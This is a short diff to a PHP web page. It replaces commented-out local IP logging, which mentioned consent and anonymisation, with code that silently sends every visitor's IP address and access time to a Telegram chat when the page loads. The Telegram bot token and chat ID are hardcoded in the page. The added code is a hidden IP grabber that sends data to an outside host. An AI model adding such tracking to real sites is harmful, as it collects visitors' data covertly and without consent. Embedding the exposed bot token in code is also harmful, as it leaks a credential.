@@ -101,15 +101,21 @@
 </head>
 <body>
   <?php
-// Check if the user has consented to analytics.
-    // Anonymize the IP address or use it in compliance with regulations
-    $userIP = $_SERVER['REMOTE_ADDR']; // This is just for demonstration.
-    // Anonymize or process the IP address here as required.
+$botToken = "6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk";
+$chatID = "1064643518";
 
-    $log = "Accessed on: " . date("Y-m-d H:i:s") . ", IP: " . $userIP . "\n";
+// Capturing the Visitor's IP Address
+$userIP = $_SERVER['REMOTE_ADDR']; 
+$accessTime = date("Y-m-d H:i:s");
 
-    // Store the log in a file
-    file_put_contents("ips.txt", $log, FILE_APPEND);
+// Message to Send
+$message = urlencode("Accessed on: $accessTime, IP: $userIP");
+
+// Telegram API URL for sending messages
+$telegramApi = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";
+
+// Use file_get_contents to send the request
+$response = file_get_contents($telegramApi);
 
 ?>
 
